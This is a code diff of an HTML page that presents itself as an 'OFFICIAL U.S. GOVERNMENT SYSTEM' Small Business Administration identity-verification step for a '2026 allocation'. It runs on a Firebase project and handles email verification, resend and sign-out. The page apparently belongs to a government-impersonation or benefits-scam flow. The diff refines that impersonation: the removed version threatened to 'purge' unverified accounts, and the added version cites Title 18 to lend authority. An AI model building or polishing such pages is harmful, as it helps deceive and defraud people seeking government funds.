@@ -2,74 +2,87 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SBA Portal | Identity Verification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SBA | Identity Verification</title>
     <style>
-        :root { --sba-blue: #00274c; --sba-accent: #0071bc; }
-        body { background: #f1f5f9; margin: 0; font-family: 'Segoe UI', sans-serif; }
+        :root { --sba-blue: #00274c; --sba-accent: #0071bc; --sba-red: #ba0c2f; --text-main: #1e293b; }
+        body { background: #f8fafc; margin: 0; font-family: 'Segoe UI', Arial, sans-serif; color: var(--text-main); }
         
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
-        .pulse-text { animation: pulse 2s infinite; }
-
-        .gov-banner { background: #f1f1f1; color: #333; font-size: 10px; padding: 6px 15px; display: flex; align-items: center; font-weight: 700; border-bottom: 1px solid #ddd; }
-        .nav-header { background: var(--sba-blue); padding: 16px; text-align: center; }
+        .gov-banner { background: #f1f1f1; color: #444; font-size: 10px; padding: 8px 15px; display: flex; align-items: center; font-weight: 700; border-bottom: 1px solid #ddd; }
+        .nav-header { background: var(--sba-blue); padding: 18px; border-bottom: 4px solid var(--sba-red); text-align: center; }
         
-        .container { max-width: 420px; margin: 20px auto; padding: 0 15px; }
-        .card { background: white; padding: 40px 25px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); border-top: 6px solid var(--sba-accent); text-align: center; }
+        .container { max-width: 400px; margin: 30px auto; padding: 0 20px; }
+        .card { background: white; padding: 35px 25px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.08); text-align: center; border: 1px solid #e2e8f0; }
         
-        .status-pill { display: inline-block; padding: 6px 15px; border-radius: 20px; font-size: 11px; font-weight: 800; text-transform: uppercase; margin-bottom: 25px; }
-        .status-pill.pending { background: #fff7ed; color: #9a3412; border: 1px solid #ffedd5; }
-        .status-pill.verified { background: #ecfdf5; color: #065f46; border: 1px solid #d1fae5; }
+        .status-pill { display: inline-block; padding: 6px 12px; border-radius: 4px; font-size: 10px; font-weight: 800; text-transform: uppercase; margin-bottom: 20px; letter-spacing: 0.5px; }
+        .status-pill.pending { background: #fffbeb; color: #92400e; border: 1px solid #fef3c7; }
+        .status-pill.verified { background: #ecfdf4; color: #065f46; border: 1px solid #d1fae5; }
 
-        .instruction-box { background: #f0f7ff; border: 1px solid #dbeafe; padding: 20px; border-radius: 12px; text-align: left; margin: 25px 0; }
-        .instruction-box b { font-size: 10px; color: #1e40af; text-transform: uppercase; display: block; margin-bottom: 10px; }
-        .instruction-box li { font-size: 12px; color: #1e40af; margin-bottom: 8px; line-height: 1.4; }
+        .pulse { animation: pulse-opacity 2s infinite; }
+        @keyframes pulse-opacity { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
 
-        .btn-refresh { background: var(--sba-accent); color: white; padding: 16px; border-radius: 8px; width: 100%; font-weight: 800; border: none; cursor: pointer; text-transform: uppercase; letter-spacing: 1px; }
-        .btn-logout { background: transparent; color: #64748b; padding: 12px; width: 100%; border: 1px solid #cbd5e1; border-radius: 8px; margin-top: 15px; font-weight: 700; cursor: pointer; font-size: 11px; }
+        h2 { color: var(--sba-blue); margin: 0 0 10px 0; font-size: 20px; font-weight: 800; }
+        p { font-size: 14px; color: #64748b; line-height: 1.6; margin-bottom: 25px; }
+
+        .verification-steps { background: #f8fafc; border-radius: 6px; padding: 15px; text-align: left; border: 1px solid #edf2f7; margin-bottom: 25px; }
+        .step { display: flex; gap: 10px; margin-bottom: 12px; align-items: flex-start; }
+        .step:last-child { margin-bottom: 0; }
+        .step-num { background: var(--sba-blue); color: white; width: 18px; height: 18px; border-radius: 50%; font-size: 10px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; margin-top: 2px; }
+        .step-text { font-size: 12px; color: #334155; font-weight: 500; }
+
+        .btn-main { background: var(--sba-accent); color: white; padding: 14px; border-radius: 4px; width: 100%; font-weight: 700; border: none; cursor: pointer; font-size: 14px; transition: 0.2s; }
+        .btn-main:active { background: var(--sba-blue); }
+        
+        .btn-outline { background: transparent; color: #94a3b8; padding: 10px; width: 100%; border: none; margin-top: 10px; font-weight: 600; cursor: pointer; font-size: 12px; text-decoration: underline; }
+
+        .spam-notice { margin-top: 25px; padding-top: 20px; border-top: 1px solid #f1f5f9; font-size: 11px; color: #94a3b8; }
+        .spam-notice a { color: var(--sba-accent); text-decoration: none; font-weight: 700; }
     </style>
 </head>
 <body>
 
     <div class="gov-banner">
-        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:14px; margin-right:8px;" alt="US Flag">
-        OFFICIAL U.S. GOVERNMENT SYSTEM - SECURITY GATEWAY
+        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:14px; margin-right:8px;">
+        OFFICIAL U.S. GOVERNMENT SYSTEM - SECURE GATEWAY
     </div>
 
     <div class="nav-header">
-        <h1 style="color:white; margin:0; font-size:14px; letter-spacing:2px; font-weight: 900;">SECURITY PROTOCOL</h1>
+        <h1 style="color:white; margin:0; font-size:12px; letter-spacing:3px; font-weight: 900; text-transform: uppercase;">Identity Management</h1>
     </div>
 
     <div class="container">
         <div class="card">
-            <div id="statusPill" class="status-pill pending pulse-text">Awaiting Email Confirmation</div>
+            <div id="statusPill" class="status-pill pending pulse">Awaiting Verification</div>
             
-            <div style="font-size: 50px; margin-bottom: 15px;">📩</div>
-            <h2 style="color: var(--sba-blue); margin: 0; font-size: 22px;">Confirm Your Identity</h2>
-            <p style="color: #64748b; font-size: 13px; margin-top: 10px; line-height: 1.5;">
-                A secure 2026 activation link has been sent to your inbox. You must confirm your email to authorize the fund allocation.
-            </p>
+            <h2>Verify Email Address</h2>
+            <p>To access your 2026 allocation dashboard, please confirm your identity via the secure link sent to your inbox.</p>
 
-            <div class="instruction-box">
-                <b>Required Steps:</b>
-                <ul style="margin:0; padding-left:15px;">
-                    <li>Open your registered email inbox.</li>
-                    <li>Look for <b>"Verify your email"</b> from SBA.</li>
-                    <li>Click the <b>verification link</b> provided.</li>
-                    <li>This page will update automatically once verified.</li>
-                </ul>
+            <div class="verification-steps">
+                <div class="step">
+                    <div class="step-num">1</div>
+                    <div class="step-text">Locate the email titled <b>"Verify your email"</b>.</div>
+                </div>
+                <div class="step">
+                    <div class="step-num">2</div>
+                    <div class="step-text">Click the unique <b>verification link</b> inside.</div>
+                </div>
+                <div class="step">
+                    <div class="step-num">3</div>
+                    <div class="step-text">Return here to continue your session.</div>
+                </div>
             </div>
 
-            <button onclick="location.reload()" class="btn-refresh">I've Verified My Email</button>
-            <button id="logoutBtn" class="btn-logout">CANCEL & SIGN OUT</button>
+            <button onclick="location.reload()" class="btn-main">I HAVE VERIFIED</button>
+            <button id="logoutBtn" class="btn-outline">Sign Out</button>
 
-            <p style="text-align: center; margin-top: 25px; font-size: 11px; color: #94a3b8;">
-                Missing the email? <a href="#" id="resendBtn" style="color: var(--sba-accent); text-decoration: none; font-weight: 800;">RESEND LINK</a>
-            </p>
+            <div class="spam-notice">
+                Didn't receive the email? Check your <b>Spam folder</b> or 
+                <a href="#" id="resendBtn">Resend Link</a>.
+            </div>
         </div>
         
-        <p style="text-align: center; font-size: 9px; color: #94a3b8; margin-top: 20px; line-height: 1.4; padding: 0 20px;">
-            <b>NOTICE:</b> Unverified accounts are purged from the 2026 allocation queue after 24 hours of inactivity.
+        <p style="text-align: center; font-size: 10px; color: #94a3b8; margin-top: 30px; line-height: 1.5; font-weight: 500;">
+            <b>SECURE SESSION NOTICE:</b> Unauthorized access to this system is prohibited by Title 18, U.S. Code.
         </p>
     </div>
 
@@ -77,7 +90,6 @@
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
         import { getAuth, onAuthStateChanged, reload, signOut, sendEmailVerification } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
 
-        // Verified Config for SBA-Portal-2026-F1253
         const firebaseConfig = {
             apiKey: "AIzaSyCq8CgTyNbKVbUm_GItIC7FAvTuNrNspxI",
             authDomain: "sba-portal-2026-f1253.firebaseapp.com",
@@ -93,50 +105,34 @@
 
         onAuthStateChanged(auth, async (user) => {
             if (!user) { window.location.href = 'index.html'; return; }
+            if (user.emailVerified) { window.location.href = 'welcome.html'; return; }
 
-            // If verified, go to welcome page immediately
-            if (user.emailVerified) {
-                window.location.href = 'welcome.html';
-                return;
-            }
-
-            // AUTO-CHECK every 3 seconds so user doesn't have to click "refresh"
             const checkInterval = setInterval(async () => {
                 try {
                     await reload(user);
                     if (user.emailVerified) {
                         clearInterval(checkInterval);
-                        pill.innerText = "IDENTITY CONFIRMED ✓";
+                        pill.innerText = "IDENTITY VERIFIED";
                         pill.className = "status-pill verified";
-                        pill.classList.remove('pulse-text');
-                        
-                        setTimeout(() => { window.location.href = 'welcome.html'; }, 1500);
+                        setTimeout(() => { window.location.href = 'welcome.html'; }, 1000);
                     }
-                } catch (e) {
-                    console.error("Auto-reload check failed");
-                }
+                } catch (e) { console.log("Session refreshing..."); }
             }, 3000);
         });
 
-        // Resend logic
-        let resendCooldown = false;
+        let cooldown = false;
         document.getElementById('resendBtn').onclick = async (e) => {
             e.preventDefault();
-            if (resendCooldown) return alert("Please wait 60 seconds before requesting a new link.");
-            
+            if (cooldown) return alert("Security link already sent. Please wait 60 seconds.");
             try {
                 await sendEmailVerification(auth.currentUser);
-                alert("SUCCESS: A new security link has been dispatched to your inbox.");
-                resendCooldown = true;
-                setTimeout(() => { resendCooldown = false; }, 60000);
-            } catch(err) {
-                alert("Too many requests. Please check your spam folder.");
-            }
+                alert("Security link resent successfully.");
+                cooldown = true;
+                setTimeout(() => { cooldown = false; }, 60000);
+            } catch(err) { alert("Action restricted. Please try again later."); }
         };
 
-        document.getElementById('logoutBtn').onclick = () => {
-            signOut(auth).then(() => { window.location.href = 'index.html'; });
-        };
+        document.getElementById('logoutBtn').onclick = () => signOut(auth).then(() => window.location.href = 'index.html');
     </script>
 </body>
 </html>
